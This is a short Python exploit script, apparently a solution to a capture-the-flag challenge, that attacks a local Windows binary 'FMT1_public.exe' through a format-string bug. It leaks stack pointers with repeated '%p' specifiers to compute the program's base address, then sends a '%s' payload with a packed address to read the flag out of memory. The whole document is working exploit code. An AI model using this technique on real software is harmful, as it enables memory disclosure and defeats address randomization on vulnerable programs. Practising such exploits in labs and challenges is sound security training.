from winpwn import * 

p = process("FMT1_public.exe") 

context.windbg = "windbg.exe" 

p.sendline("%p."*113 + "+" + "%p."*8 + "+")

# base address of text 
pie_base = int(p.recvuntil("+")[-10:-2], 16) - 0x13a5 
flag_addr = pie_base + 0x2110 
print("BASE = " + hex(pie_base))
print("FLAG_ADDR = " + hex(flag_addr))

payload =  "%x." * 3 + "%s."  +  p32(flag_addr)
# windbg.attach(p, "bp 3c1046")
p.sendline(payload)

p.interactive()